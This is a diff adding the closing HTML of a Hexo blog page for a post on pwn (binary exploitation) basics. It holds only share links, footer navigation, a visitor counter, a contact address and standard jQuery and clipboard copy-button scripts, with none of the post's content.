+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/pwn%E7%9A%84%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80/&title=pwn的小试牛刀"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/pwn%E7%9A%84%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80/&title=pwn的小试牛刀"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/pwn%E7%9A%84%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80/&title=pwn的小试牛刀"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/pwn%E7%9A%84%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80/&title=pwn的小试牛刀"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/pwn%E7%9A%84%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80/&name=pwn的小试牛刀&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/pwn%E7%9A%84%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80/&t=pwn的小试牛刀"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    Sh_eePppp
+  </div>
+
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">h0me</a></li><!--
+    --><!--
+      --><li><a href="/categories">Categ0r1es</a></li><!--
+    --><!--
+      --><li><a href="/archives/">Artic1es</a></li><!--
+    --><!--
+      --><li><a href="/links/">L1nks</a></li><!--
+    --><!--
+      --><li><a href="/search/">Searh</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+
+  <!-- 邮箱信息独立出来，靠右下角 -->
+  <div class="footer-contact">
+    如果文章出现错误，可以联系我进行更改，感谢 
+    <a href="mailto:sh_eepppp@qq.com  ：）">sh_eepppp@qq.com</a>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
